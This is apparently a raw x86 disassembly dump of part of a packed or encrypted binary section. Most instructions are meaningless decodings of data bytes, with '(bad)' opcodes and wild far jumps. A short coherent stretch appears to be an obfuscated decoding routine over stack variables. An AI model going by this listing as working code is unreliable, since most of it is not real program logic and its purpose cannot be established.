  413dd8:	lods   eax,DWORD PTR ds:[esi]
  413dd9:	cmp    eax,0xe3753ad6
  413dde:	repnz or eax,0x5a103892
  413de4:	cdq    
  413de5:	add    BYTE PTR [esi],ch
  413de7:	stos   BYTE PTR es:[edi],al
  413de8:	xor    al,0xd3
  413dea:	cmovb  ebx,DWORD PTR [eax-0x221e5a2f]
  413df1:	inc    edx
  413df2:	pop    ds
  413df3:	bound  edx,QWORD PTR [ebx+0x794de961]
  413df9:	mov    edi,DWORD PTR [esi]
  413dfb:	or     ch,dl
  413dfd:	and    al,0xf1
  413dff:	out    0x6a,al
  413e01:	lods   al,BYTE PTR ds:[esi]
  413e02:	cdq    
  413e03:	pop    ds
  413e04:	jecxz  0x413d86
  413e06:	xor    DWORD PTR [eax-0x68773084],ebx
  413e0c:	test   al,0x4e
  413e0e:	xor    al,0x1e
  413e10:	mov    ebp,DWORD PTR [esi-0x45]
  413e13:	push   ds
  413e14:	gs dec ebx
  413e16:	xor    al,0xa
  413e18:	jge    0x413de1
  413e1a:	es dec ebp
  413e1c:	xchg   ebp,eax
  413e1d:	cdq    
  413e1e:	stc    
  413e1f:	xchg   ah,dh
  413e21:	jnp    0x413e20
  413e23:	cs cwde 
  413e25:	rol    dl,0x6
  413e28:	cdq    
  413e29:	pop    ebx
  413e2a:	mov    edx,DWORD PTR [esi-0x43]
  413e2d:	pop    ebp
  413e2e:	mov    ebx,0x40dd80f9
  413e33:	lahf   
  413e34:	mov    esi,0x3f632eca
  413e39:	mul    BYTE PTR [edi]
  413e3b:	(bad)  
  413e3c:	mov    al,ds:0xa3f5dd03
  413e41:	lea    edx,[edx]
  413e43:	stos   DWORD PTR es:[edi],eax
  413e44:	xor    cl,BYTE PTR [ebx+0x1d]
  413e47:	sub    BYTE PTR [edi+ecx*2+0x334c5444],bl
  413e4e:	jge    0x413e39
  413e50:	(bad)  
  413e51:	(bad)  [eax-0x66]
  413e54:	mov    ch,0x3f
  413e56:	xchg   ebp,eax
  413e57:	mov    al,0x3a
  413e59:	mov    ecx,0x3043115a
  413e5e:	cmp    eax,0x4b2691a3
  413e63:	jns    0x413e4a
  413e65:	xor    al,0x3f
  413e67:	inc    eax
  413e68:	shr    BYTE PTR [edi],cl
  413e6a:	sbb    BYTE PTR [eax+0x71],0xef
  413e6e:	and    al,0x54
  413e70:	test   al,0x42
  413e72:	mov    ah,0x68
  413e74:	xor    eax,0x7d5454e3
  413e79:	push   ebp
  413e7a:	nop
  413e7b:	imul   ebp,edx,0xb
  413e7e:	jecxz  0x413ec4
  413e80:	dec    BYTE PTR [eax-0x5f955cb]
  413e86:	test   al,0xf
  413e88:	(bad)  
  413e89:	xchg   ebp,eax
  413e8a:	outs   dx,BYTE PTR ds:[esi]
  413e8b:	jp     0x413ec6
  413e8d:	sub    al,0x8a
  413e8f:	jecxz  0x413e43
  413e91:	cwde   
  413e92:	sbb    BYTE PTR [ebx-0x451b11b6],cl
  413e98:	loop   0x413e1c
  413e9a:	pop    es
  413e9b:	aas    
  413e9c:	ds dec edi
  413e9e:	ins    DWORD PTR es:[edi],dx
  413e9f:	cli    
  413ea0:	dec    ebx
  413ea1:	pop    ebp
  413ea2:	fimul  DWORD PTR [edi-0x82c80e0]
  413ea8:	mov    ds:0x8c7460b,al
  413ead:	sub    DWORD PTR ds:0x82c66909,edx
  413eb3:	sub    al,0xe1
  413eb5:	sub    ebx,esp
  413eb7:	ret    0x4dd
  413eba:	mov    WORD PTR [esi],gs
  413ebc:	cmp    dh,dh
  413ebe:	inc    ebp
  413ebf:	mov    eax,0x53fa5f35
  413ec4:	mov    dh,0xc4
  413ec6:	add    al,dl
  413ec8:	jle    0x413ee1
  413eca:	jle    0x413e4f
  413ecc:	dec    eax
  413ecd:	xchg   ebx,eax
  413ece:	xchg   edx,eax
  413ecf:	je     0x413ea9
  413ed1:	mov    eax,ds:0xa880d047
  413ed6:	jmp    0x6d3e1613
  413edb:	xlat   BYTE PTR ds:[ebx]
  413edc:	sti    
  413edd:	or     al,0x56
  413edf:	cwde   
  413ee0:	jecxz  0x413ec7
  413ee2:	pop    ds
  413ee3:	leave  
  413ee4:	adc    al,0x33
  413ee6:	mov    bh,0xf1
  413ee8:	scas   al,BYTE PTR es:[edi]
  413ee9:	iret   
  413eea:	sbb    eax,0xcfb7f60e
  413eef:	mov    bh,0xae
  413ef1:	scas   eax,DWORD PTR es:[edi]
  413ef2:	repz daa 
  413ef4:	in     eax,dx
  413ef5:	into   
  413ef6:	adc    bh,BYTE PTR [edx-0x64]
  413ef9:	ret    
  413efa:	sbb    DWORD PTR [eax-0x82dc301],0xe6182650
  413f04:	dec    esp
  413f05:	push   esp
  413f06:	xchg   ecx,eax
  413f07:	fmulp  st(5),st
  413f09:	aam    0xdf
  413f0b:	dec    edi
  413f0c:	icebp  
  413f0d:	cmp    DWORD PTR [ebx],eax
  413f0f:	retf   0xf3e2
  413f12:	sbb    ebx,edi
  413f14:	mov    al,0x6e
  413f16:	cmc    
  413f17:	push   0x624c9e6c
  413f1c:	test   BYTE PTR [esi+ebp*4-0x8889db6],ch
  413f23:	je     0x413f40
  413f25:	cs sahf 
  413f27:	rcl    bl,0x47
  413f2a:	pop    eax
  413f2b:	and    al,0x9e
  413f2d:	cdq    
  413f2e:	adc    eax,0x64a0454d
  413f33:	add    al,0x76
  413f35:	aaa    
  413f36:	add    DWORD PTR ds:0xb29d4faf,edi
  413f3c:	dec    esi
  413f3d:	data16 fsub st(4),st
  413f40:	push   0xffffffde
  413f42:	lods   eax,DWORD PTR ds:[esi]
  413f43:	gs push ss
  413f45:	sbb    BYTE PTR [esi],ah
  413f47:	repnz sbb BYTE PTR [eax+0x74],0xd1
  413f4c:	shl    DWORD PTR [edx+0x8f5b332],0x71
  413f53:	shl    DWORD PTR [eax-0x332fdf64],0xce
  413f5a:	popf   
  413f5b:	cmp    dl,ah
  413f5d:	push   cs
  413f5e:	cmp    DWORD PTR [eax+0x40],edi
  413f61:	in     al,dx
  413f62:	outs   dx,DWORD PTR ds:[esi]
  413f63:	jg     0x413f2b
  413f65:	adc    DWORD PTR fs:[esi],0x4f
  413f69:	or     edi,DWORD PTR [ebx+eiz*2+0x4d]
  413f6d:	(bad)  
  413f6e:	ret    0xcad
  413f71:	xchg   DWORD PTR [ecx+esi*8-0x28],ecx
  413f75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f76:	sbb    edi,DWORD PTR [edi]
  413f78:	add    DWORD PTR [ebp+0x72],ebp
  413f7b:	imul   edi,DWORD PTR [ebx+edi*2+0x20263a9b],0x4c3d9ba9
  413f86:	and    BYTE PTR [esi-0x7a30c648],0xeb
  413f8d:	call   0x4c634e94
  413f92:	rcl    DWORD PTR [ecx],0x56
  413f95:	mov    esi,0xe96be3a4
  413f9a:	mov    edx,DWORD PTR [ebp+0x8]
  413f9d:	mov    ebx,DWORD PTR [ebp-0x8]
  413fa0:	xor    edx,eax
  413fa2:	xor    ebx,eax
  413fa4:	sub    edx,ebx
  413fa6:	sub    edx,esi
  413fa8:	xor    edx,eax
  413faa:	mov    DWORD PTR [ebp+0x8],edx
  413fad:	mov    edx,DWORD PTR [ebp+0x8]
  413fb0:	mov    ebx,DWORD PTR [ebp-0x58]
  413fb3:	add    edx,0x5708c4
  413fb9:	imul   edx,ebx
  413fbc:	mov    DWORD PTR [ebp-0x58],edx
  413fbf:	mov    edx,DWORD PTR [ebp+0x8]
  413fc2:	mov    ebx,DWORD PTR [ebp-0x54]
  413fc5:	add    edx,0x64f8da
  413fcb:	or     edx,ebx
  413fcd:	mov    DWORD PTR [ebp-0x54],edx
  413fd0:	mov    edx,DWORD PTR [ebp+0x8]
  413fd3:	mov    ebx,DWORD PTR [ebp-0x50]
  413fd6:	add    edx,ecx
  413fd8:	xor    edx,ebx
  413fda:	mov    DWORD PTR [ebp-0x50],edx
  413fdd:	mov    edx,DWORD PTR [ebp+0x8]
  413fe0:	mov    ebx,DWORD PTR [ebp-0x4c]
  413fe3:	add    edx,edi
  413fe5:	and    edx,ebx
  413fe7:	mov    DWORD PTR [ebp-0x4c],edx
  413fea:	mov    edx,DWORD PTR [ebp+0x8]
  413fed:	mov    ebx,DWORD PTR [ebp-0x48]
  413ff0:	lea    edx,[ebx+edx*1+0x241fc1f]
  413ff7:	mov    DWORD PTR [ebp-0x48],edx
  413ffa:	mov    edx,DWORD PTR [ebp+0x8]
  413ffd:	mov    ebx,0xfa5e15e2
  414002:	jmp    0x4163b6
  414007:	scas   eax,DWORD PTR es:[edi]
  414008:	shl    BYTE PTR [eax-0x7f],cl
  41400b:	jno    0x413f90
  41400d:	scas   eax,DWORD PTR es:[edi]
  41400e:	mov    dl,0xfb
  414010:	xor    DWORD PTR [edi-0x3e],edx
  414013:	or     eax,0xa2869048
  414018:	je     0x414096
  41401a:	jl     0x414007
  41401c:	pop    edi
  41401d:	jl     0x41409b
  41401f:	pop    ss
  414020:	and    BYTE PTR [edi],0xc8
  414023:	cld    
  414024:	retf   
  414025:	xor    DWORD PTR [esi],ecx
  414027:	ret    0xbd5b
  41402a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41402b:	push   edx
  41402c:	je     0x41402e
  41402e:	lods   al,BYTE PTR ds:[esi]
  41402f:	inc    esi
  414030:	js     0x414049
  414032:	xor    al,0x35
  414034:	adc    ebp,ebp
  414036:	xchg   ecx,eax
  414037:	xchg   edx,eax
  414039:	iret   
  41403a:	or     ah,BYTE PTR [edi-0x5b]
  41403d:	in     eax,dx
  41403e:	leave  
  41403f:	xor    ebp,esp
  414041:	mov    ds:0xf7378889,eax
  414046:	jmp    0x41407f
  414048:	or     eax,DWORD PTR [ebp+0x2825eb2b]
  41404e:	icebp  
  41404f:	in     eax,dx
  414050:	popa   
  414051:	and    BYTE PTR [ebx+0x46],al
  414054:	icebp  
  414055:	cli    
  414056:	ret    
  414057:	lock out dx,eax
  414059:	stos   DWORD PTR es:[edi],eax
  41405a:	je     0x413ff8
  41405c:	add    bh,BYTE PTR [edx+0xb1dd370]
  414062:	dec    eax
  414063:	lods   eax,DWORD PTR ds:[esi]
  414064:	dec    ebp
  414065:	jl     0x413ff6
  414067:	aam    0xda
  414069:	adc    eax,0xe3a02d68
  41406e:	fistp  DWORD PTR [ebp+0x105f7550]
  414074:	lods   al,BYTE PTR ds:[esi]
  414075:	cli    
  414076:	mov    DWORD PTR [edi+edx*2+0x7a],0x8b927dd
  41407e:	push   0xfb9123be
  414083:	xchg   esi,eax
  414084:	dec    ebp
  414085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414086:	pop    ebp
  414087:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  414089:	imul   esp,ebx,0x3c
  41408c:	pop    ss
  41408d:	mov    al,0x7f
  41408f:	out    dx,eax
  414090:	call   0x2320:0x8d7684be
  414097:	lods   eax,DWORD PTR ds:[esi]
  414098:	and    BYTE PTR [ebx-0x60afcd58],0xfd
  41409f:	pushf  
  4140a0:	out    0x3d,al
  4140a2:	sub    al,0xa6
  4140a4:	or     BYTE PTR [ebx],dh
  4140a6:	inc    ebx
  4140a7:	inc    ebx
  4140a8:	rol    BYTE PTR [ecx-0x5],0xdb
  4140ac:	push   esi
  4140ad:	mov    es,WORD PTR [edx]
  4140af:	xor    dl,bl
  4140b1:	jae    0x41408b
  4140b3:	and    eax,esp
  4140b5:	retf   0x389d
  4140b8:	jecxz  0x41404f
  4140ba:	test   BYTE PTR [edi+ecx*8+0x4f73704f],0xc
  4140c2:	lds    edx,FWORD PTR [ebp+0x5a9730ed]
  4140c8:	mov    al,0xc4
  4140ca:	outs   dx,DWORD PTR ds:[esi]
  4140cb:	and    eax,0x774467a5
  4140d0:	dec    esp
  4140d1:	dec    edi
  4140d2:	push   0x27
  4140d4:	jp     0x414154
  4140d6:	or     DWORD PTR [edi+0x4c],esi
  4140d9:	scas   al,BYTE PTR es:[edi]
  4140da:	test   BYTE PTR [ebx],bl
  4140dc:	scas   eax,DWORD PTR es:[edi]
  4140dd:	es jmp 0x64ba:0xf9f2188c
  4140e5:	or     al,0x2f
  4140e7:	imul   eax,edx,0x47a117b2
  4140ed:	outs   dx,DWORD PTR ds:[esi]
  4140ee:	fistp  WORD PTR [edx+0x3c]
  4140f1:	and    cl,cl
  4140f3:	push   ebp
  4140f4:	pop    ds
  4140f5:	jecxz  0x4140f8
  4140f7:	fadd   QWORD PTR [ecx+0x3b]
  4140fa:	sbb    esi,DWORD PTR [edx]
  4140fc:	mov    cl,BYTE PTR [edx+0x13]
  4140ff:	lods   al,BYTE PTR ds:[esi]
  414100:	xchg   edx,eax
  414101:	jmp    0x4140f7
  414103:	mov    al,ds:0x18cb9943
  414108:	inc    edx
  414109:	mov    ch,0x42
  41410b:	std    
  41410c:	push   ebp
  41410d:	jns    0x4140a9
  41410f:	rcl    BYTE PTR [ecx-0x6c],cl
  414112:	jmp    0x1cfa:0xec062ba5
  414119:	(bad)  [ebp-0x1a8acd7]
  41411f:	jne    0x414150
  414121:	cs (bad) 
  414123:	mov    esi,0x4224d3ab
  414128:	out    dx,al
  414129:	xchg   esi,eax
  41412a:	outs   dx,DWORD PTR ds:[esi]
  41412b:	inc    ax
  41412d:	mov    cl,0xa9
  41412f:	xchg   esp,eax
  414130:	adc    ecx,DWORD PTR [ecx+0x6d]
  414133:	inc    ebp
  414134:	ja     0x414111
  414136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414137:	cs leave 
  414139:	mov    al,ds:0x7cc4f974
  41413e:	ds pop ds
  414140:	nop
  414141:	std    
  414142:	std    
  414143:	out    0xf7,al
  414145:	lods   eax,DWORD PTR ds:[esi]
  414146:	fstp   DWORD PTR [edi]
  414148:	dec    edx
  414149:	or     DWORD PTR [edi],esi
  41414b:	in     al,dx
  41414c:	jle    0x4140f1
  41414e:	mov    al,ds:0x98b6513e
  414153:	jmp    0xbc3155f7
  414158:	jo     0x4141d5
  41415a:	out    0x31,eax
  41415c:	je     0x414191
  41415e:	inc    esp
  41415f:	push   edi
  414160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414161:	pop    ebp
  414162:	adc    BYTE PTR [ecx+eax*2],bl
  414165:	cmp    eax,0xee6b1bec
  41416a:	test   ah,bh
  41416c:	ficomp WORD PTR [ecx+0x43]
  41416f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414170:	test   DWORD PTR [ebp-0x300afb8c],ebp
  414176:	gs pop edi
  414178:	mov    al,ds:0x8cd6ba07
  41417d:	fst    DWORD PTR [ecx+ebx*2-0x15d220fc]
  414184:	add    DWORD PTR [ecx+ebp*4],eax
  414187:	push   ss
  414188:	cmp    eax,0x77bb1894
  41418d:	sub    bh,dh
  41418f:	cmp    al,0x44
  414191:	out    0xfd,al
  414193:	clc    
  414194:	mov    eax,ds:0xb4966910
  414199:	inc    edx
  41419a:	lds    edi,FWORD PTR [edi]
  41419c:	and    al,0x5d
  41419e:	or     BYTE PTR [eax],ch
  4141a0:	lods   eax,DWORD PTR ds:[esi]
  4141a1:	stos   DWORD PTR es:[edi],eax
  4141a2:	and    ch,BYTE PTR [eax+0x71]
  4141a5:	add    ah,BYTE PTR [ecx+0x2bf4cf26]
  4141ab:	js     0x41414d
  4141ad:	outs   dx,DWORD PTR ds:[esi]
  4141ae:	es ja  0x414162
  4141b1:	sbb    eax,0x81d6c8ed
  4141b6:	mov    ah,0xf3
  4141b8:	cmp    esp,ecx
  4141ba:	hlt    
  4141bb:	pop    ebx
  4141bc:	inc    edx
  4141bd:	sub    eax,0x8306aac6
  4141c2:	add    eax,DWORD PTR [edx+0x6bafac34]
  4141c8:	das    
  4141c9:	rcl    esp,cl
  4141cb:	push   es
  4141cc:	outs   dx,DWORD PTR ds:[esi]
  4141cd:	repnz or DWORD PTR [ebp+0x37],ebp
  4141d1:	mov    eax,ds:0x5ac62e49
  4141d6:	jge    0x4141c6
  4141d8:	or     bl,BYTE PTR [eax+0x3]
  4141db:	cdq    
  4141dc:	fstp   QWORD PTR [ebp-0xc1feec8]
  4141e2:	mov    WORD PTR gs:[esi-0x28629d12],ss
  4141e9:	sbb    BYTE PTR [ebx+0x496d6bc5],bl
  4141ef:	pop    ecx
  4141f0:	out    dx,al
  4141f1:	xchg   ebp,eax
  4141f2:	or     esp,DWORD PTR [eax+0x4]
  4141f5:	jmp    0xc8fe:0x7a5fe002
  4141fc:	popa   
  4141fd:	mov    ebx,0x877a1e8b
  414202:	xchg   esp,eax
  414203:	inc    ebp
  414204:	pop    edx
  414205:	ins    BYTE PTR es:[edi],dx
  414206:	mov    bh,0xff
  414208:	xor    esi,DWORD PTR [edx-0x155fd4b2]
  41420e:	mov    esi,0x2220890
  414213:	mov    eax,0x8bcf86c0
  414218:	cmp    BYTE PTR [esi],bh
  41421a:	jmp    0x8fe6:0x42cfb239
  414221:	sbb    cl,al
  414223:	mov    cl,BYTE PTR [eax]
  414225:	jl     0x4141d8
  414227:	inc    eax
  414228:	mov    dh,0xfb
  41422a:	in     al,dx
  41422b:	repnz sub bl,ch
  41422e:	sbb    al,dh
  414230:	ja     0x414239
  414232:	or     BYTE PTR [ecx],ch
  414234:	dec    esi
  414235:	adc    DWORD PTR [ecx],0xfffffff5
  414238:	pop    edx
  414239:	outs   dx,DWORD PTR ds:[esi]
  41423a:	imul   BYTE PTR [edx+ebx*4+0x5b476465]
  414241:	jle    0x4142b3
  414243:	mov    ah,0x7
  414245:	mov    ch,0x7f
  414247:	rol    DWORD PTR ds:0xbae077f5,1
  41424d:	add    ebx,esi
  41424f:	ja     0x41421e
  414251:	nop
  414252:	fbld   TBYTE PTR [edx]
  414254:	adc    eax,DWORD PTR [eax]
  414256:	repnz lea edx,[eax-0x65]
  41425a:	nop
  41425b:	ret    0x8e55
  41425e:	xchg   esp,eax
  41425f:	lds    esi,FWORD PTR [eax+0x3e]
  414262:	cmp    eax,0x6e937e2
  414267:	mov    cl,0x3e
  414269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41426a:	ins    DWORD PTR es:[edi],dx
  41426b:	inc    ebx
  41426c:	clc    
  41426d:	pop    ebp
  41426e:	pop    ds
  41426f:	push   eax
  414270:	jnp    0x414232
  414272:	inc    ecx
  414273:	mov    bl,0xba
  414275:	(bad)  
  414276:	cmp    BYTE PTR [edi-0x6c],dl
  414279:	es scas al,BYTE PTR es:[edi]
  41427b:	loope  0x414245
  41427d:	jbe    0x41424e
  41427f:	pop    ebp
  414280:	mov    BYTE PTR [eax+0x76],al
  414283:	lahf   
  414284:	popa   
  414285:	and    edx,edx
  414287:	pop    ss
  414288:	push   es
  414289:	(bad)  
  41428a:	nop
  41428b:	leave  
  41428c:	mov    dl,dh
  41428e:	mov    ds:0xa6f321e9,al
  414293:	int3   
  414294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414295:	pop    eax
  414296:	test   DWORD PTR [eax+0x267e7b37],0xaade675c
  4142a0:	cld    
  4142a1:	pop    es
  4142a2:	imul   ebp,DWORD PTR [edi+0x66],0xffffffaf
  4142a6:	mov    dl,0x8e
  4142a8:	arpl   di,di
  4142aa:	xchg   ebx,eax
  4142ab:	idiv   DWORD PTR [ebx-0x7]
  4142ae:	push   ebp
  4142af:	mov    esi,0x18f0e5e0
  4142b4:	push   cs
  4142b5:	cmp    DWORD PTR [edi-0x7c],0xf408016b
  4142bc:	js     0x4142ce
  4142be:	ja     0x414250
  4142c0:	push   ebp
  4142c1:	xchg   ebx,eax
  4142c2:	pop    edx
  4142c3:	or     al,BYTE PTR [edi]
  4142c5:	mov    ch,0x8e
  4142c7:	mov    dh,0xd3
  4142c9:	or     dh,dl
  4142cb:	jecxz  0x414292
  4142cd:	and    DWORD PTR [ebp+0x4b],edi
  4142d0:	ins    DWORD PTR es:[edi],dx
  4142d1:	jo     0x414319
  4142d3:	inc    esi
  4142d4:	lds    edi,FWORD PTR [edx]
  4142d6:	inc    DWORD PTR [ebp+0x3934a214]
  4142dc:	pusha  
  4142dd:	dec    cx
  4142df:	inc    ebx
  4142e0:	pop    eax
  4142e1:	or     ecx,DWORD PTR [esi+0x5a4a1604]
  4142e7:	imul   esi,DWORD PTR [ecx+edi*8]
  4142eb:	in     al,dx
  4142ec:	pop    ebp
  4142ed:	xchg   BYTE PTR [esi*8-0x7560a9cd],bh
  4142f4:	mov    eax,0x2e38d7d5
  4142f9:	int3   
  4142fa:	adc    BYTE PTR [eax-0x25178269],0x90
  414301:	fdiv   QWORD PTR [esi]
  414303:	and    edx,DWORD PTR [esi+0x6e]
  414306:	sbb    DWORD PTR gs:[ecx-0xfafee83],0x9d6f3ca2
  414311:	mov    cl,0xe8
  414313:	xchg   bh,dh
  414315:	sub    ch,BYTE PTR [ebx+0x445e94f3]
  41431b:	fcomip st,st(2)
  41431d:	jmp    0x5c6bad01
  414322:	jbe    0x414352
  414324:	cmp    ebp,edi
  414326:	in     al,dx
  414327:	test   DWORD PTR [ecx-0x2f0ecee9],0xe0421a66
  414331:	mov    ah,0x51
  414333:	push   esi
  414334:	cdq    
  414335:	sbb    esi,DWORD PTR [esi]
  414337:	dec    edx
  414338:	cwde   
  414339:	(bad)  
  41433a:	stc    
  41433b:	enter  0x3a45,0xcf
  41433f:	xchg   BYTE PTR [esi+0x6a568811],dh
  414345:	push   esi
  414346:	inc    edx
  414347:	repz and edi,DWORD PTR [esi-0x4c9ffa3]
  41434e:	pop    es
  41434f:	(bad)
  414352:	jecxz  0x4142f8
  414354:	sbb    dl,ch
  414356:	cs inc edx
  414358:	(bad)  
  41435a:	pop    edi
  41435b:	test   al,0xb7
  41435d:	dec    ecx
  41435e:	pop    ebp
  41435f:	rcl    BYTE PTR [edi+0x77b85d9e],cl
  414365:	test   al,0x80
  414367:	mov    dl,dl
  414369:	popf   
  41436a:	jle    0x4142f1
  41436c:	icebp  
  41436d:	int3   
  41436e:	mov    eax,ds:0x9de1e47
  414373:	sub    DWORD PTR [edx+edi*8+0x62],eax
  414377:	jecxz  0x41431c
  414379:	xor    ah,BYTE PTR [ecx-0x14]
  41437c:	dec    edx
  41437d:	outs   dx,DWORD PTR ds:[esi]
  41437e:	push   cs
  41437f:	inc    edi
  414380:	pop    ebx
  414381:	aas    
  414382:	ret    0x9523
  414385:	cld    
  414386:	xor    edx,DWORD PTR [edx-0x31]
  414389:	rcl    BYTE PTR [ebp-0x15d13a9b],0x19
  414390:	jo     0x41437c
  414392:	in     al,0x50
  414394:	jl     0x41438a
  414396:	or     al,al
  414398:	loope  0x4143a9
  41439a:	or     BYTE PTR [ecx-0x1893247d],bh
  4143a0:	or     BYTE PTR [ecx+0x21],0x47
  4143a4:	sub    edi,DWORD PTR [eax-0x6]
  4143a7:	aam    0x96
  4143a9:	das    
  4143aa:	xchg   BYTE PTR [eax],dh
  4143ac:	in     eax,0xc
  4143ae:	aam    0xd4
  4143b0:	retf   0x96b1
  4143b3:	mov    ds,WORD PTR [esi-0x42f28f3f]
  4143b9:	jmp    0x414410
  4143bb:	(bad)
  4143be:	outs   dx,DWORD PTR ds:[esi]
  4143bf:	or     eax,0xe9b1fc33
  4143c4:	jmp    0xcdcd3d9d
  4143c9:	inc    esp
  4143ca:	leave  
  4143cb:	out    dx,eax
  4143cc:	lea    ebx,[edx+0x5fb2ebbf]
  4143d2:	mov    ebx,0x445e027a
  4143d7:	push   edi
  4143d8:	push   edx
  4143d9:	inc    ebx
  4143da:	imul   ebp,ebp,0x1c
  4143dd:	xchg   cl,bh
  4143df:	pop    ecx
  4143e0:	aas    
  4143e1:	xchg   DWORD PTR [eax],edi
  4143e3:	enter  0x50b7,0x1c
  4143e7:	fs data16 stos BYTE PTR es:[edi],al
  4143ea:	lds    esi,FWORD PTR es:[edx]
  4143ed:	mul    DWORD PTR [eax-0xd]
  4143f0:	ror    DWORD PTR [esi+0xd],cl
  4143f3:	jnp    0x414427
  4143f5:	mov    eax,ds
  4143f7:	in     eax,dx
  4143f8:	hlt    
  4143f9:	xchg   esp,eax
  4143fa:	dec    edi
  4143fb:	inc    ecx
  4143fc:	and    cl,BYTE PTR [eax-0x67ac3f27]
  414402:	leave  
  414403:	(bad)  
  414404:	mov    ebx,0xc089d92f
  414409:	sar    DWORD PTR [edx+ebp*2+0x5105eaa9],0xf0
  414411:	adc    BYTE PTR [esp+ecx*1],bh
  414414:	xchg   esi,eax
  414415:	mov    ah,0xb9
  414417:	or     BYTE PTR [eax],cl
  414419:	pop    ecx
  41441a:	ret    0xef64
  41441d:	pop    es
  41441e:	fdiv   st(7),st
  414420:	arpl   WORD PTR [edi],bx
  414422:	js     0x414475
  414424:	jae    0x4143d7
  414426:	sub    al,0x41
  414428:	push   es
  414429:	dec    esi
  41442a:	inc    ebx
  41442b:	mov    ds:0xf6f3e08,al
  414430:	jle    0x41446d
  414432:	push   edi
  414433:	dec    ebp
  414434:	(bad)  
  414435:	lock lds esi,FWORD PTR [eax+0x5ac54ff0]
  41443c:	dec    esi
  41443d:	mov    cl,0xfb
  41443f:	ins    DWORD PTR es:[edi],dx
  414440:	repz scas eax,DWORD PTR es:[edi]
  414442:	add    DWORD PTR [ecx],ecx
  414444:	mov    ah,0x93
  414446:	cli    
  414447:	ins    DWORD PTR es:[edi],dx
  414448:	dec    ecx
  414449:	loop   0x4144c6
  41444b:	xor    cl,BYTE PTR [ebx+0x7e72fe3b]
  414451:	in     eax,dx
  414452:	xchg   ebp,eax
  414453:	(bad)  
  414454:	outs   dx,BYTE PTR ds:[esi]
  414455:	test   eax,0x40e4a95b
  41445a:	mov    ds:0x3e3b3e30,al
  41445f:	pop    es
  414460:	pop    edx
  414461:	pop    esp
  414462:	pop    esi
  414463:	mov    dh,0x51
  414465:	pusha  
  414466:	pop    ebx
  414467:	cmp    DWORD PTR [edi+0x15],ebp
  41446a:	mov    ds:0xb313e94,al
  41446f:	es daa 
  414471:	mov    ds:0x3dbcaa1f,al
  414476:	push   edi
  414477:	xchg   esp,eax
  414478:	nop
  414479:	shr    DWORD PTR [ebx+0x2],0xca
  41447d:	out    0x4f,eax
  41447f:	mov    edi,0x28267f61
  414484:	push   ecx
  414485:	les    ebp,FWORD PTR [esi-0x3f]
  414488:	mov    bl,0xf7
  41448a:	sub    BYTE PTR [eax],0x71
  41448d:	xor    esp,DWORD PTR [ebp-0x31]
  414490:	aaa    
  414491:	retf   0xab99
  414494:	cli    
  414495:	pop    ds
  414496:	mov    ecx,0xab89db51
  41449b:	daa    
  41449c:	xor    bl,al
  41449e:	pop    ss
  41449f:	xlat   BYTE PTR ds:[ebx]
  4144a0:	sahf   
  4144a1:	fucomip st,st(3)
  4144a3:	ja     0x41447e
  4144a5:	add    edx,DWORD PTR [ebp-0xd]
  4144a8:	arpl   bx,di
  4144aa:	push   ss
  4144ab:	jmp    0xfea7:0xa1716c52
  4144b2:	mov    dl,0x14
  4144b4:	mov    edi,0x7712540c
  4144b9:	dec    esi
  4144ba:	inc    edx
  4144bb:	ja     0x4144fa
  4144bd:	mov    bh,0x8a
  4144bf:	and    ebx,eax
  4144c1:	in     eax,0xf6
  4144c3:	adc    eax,ecx
  4144c5:	or     al,0xb5
  4144c7:	xor    BYTE PTR [esi+edi*8],ch
  4144ca:	jp     0x4144eb
  4144cc:	(bad)  
  4144cd:	xor    BYTE PTR [edi-0x51b3531],cl
  4144d3:	pushf  
  4144d4:	cmp    esp,DWORD PTR [esi-0x1653a6a0]
  4144da:	inc    ecx
  4144db:	outs   dx,BYTE PTR ds:[esi]
  4144dc:	cmc    
  4144dd:	out    dx,al
  4144de:	cli    
  4144df:	mov    bh,BYTE PTR [edi-0x40]
  4144e2:	adc    al,0xb0
  4144e4:	and    BYTE PTR [eax+0x48],bh
  4144e7:	xor    BYTE PTR [eax],ah
  4144e9:	push   ebx
  4144ea:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144ec:	mov    al,ds:0x9007b497
  4144f1:	lds    edx,FWORD PTR [edi]
  4144f3:	jg     0x41450b
  4144f5:	sbb    ch,al
  4144f7:	adc    ebx,ecx
  4144f9:	and    eax,0x7ad32daf
  4144fe:	push   cs
  4144ff:	pop    esi
  414500:	lock sti 
  414502:	xor    DWORD PTR [esi],eax
  414504:	nop
  414505:	imul   ecx,DWORD PTR [esi-0x7e],0xffffffa8
  414509:	mov    edx,0xb83a21e6
  41450e:	test   ecx,ebx
  414510:	repnz cmc 
  414512:	add    ch,BYTE PTR [esi-0x5b]
  414515:	fdivr  DWORD PTR ds:0x571dda02
  41451b:	dec    eax
  41451c:	sub    ebp,DWORD PTR [ebx-0x75]
  41451f:	rcl    DWORD PTR [ebx+0x1e],1
  414522:	out    dx,eax
  414523:	test   WORD PTR [ebx+0x1f],cx
  414527:	out    dx,al
  414528:	shl    BYTE PTR [eax+0x68339028],0x95
  41452f:	fs ins DWORD PTR es:[edi],dx
  414531:	js     0x4145a6
  414533:	pop    edx
  414534:	ret    0x8030
  414537:	xchg   ebx,eax
  414538:	mov    ah,0xca
  41453a:	cmp    eax,0xdb77ecd5
  41453f:	(bad)  
  414540:	(bad)  
  414541:	int3   
  414542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414543:	xchg   edx,eax
  414544:	xchg   esp,eax
  414545:	push   edx
  414546:	clc    
  414547:	dec    ebx
  414548:	stos   BYTE PTR es:[edi],al
  414549:	xchg   esp,eax
  41454a:	mov    bl,cl
  41454c:	mov    dl,0x9
  41454e:	and    BYTE PTR [ebx],dl
  414550:	sbb    bh,BYTE PTR [ecx+ebx*1-0x62961d1d]
  414557:	ret    
  414558:	inc    ebp
  414559:	mov    ch,0x8b
  41455b:	clc    
  41455c:	pop    esi
  41455d:	cmp    cl,cl
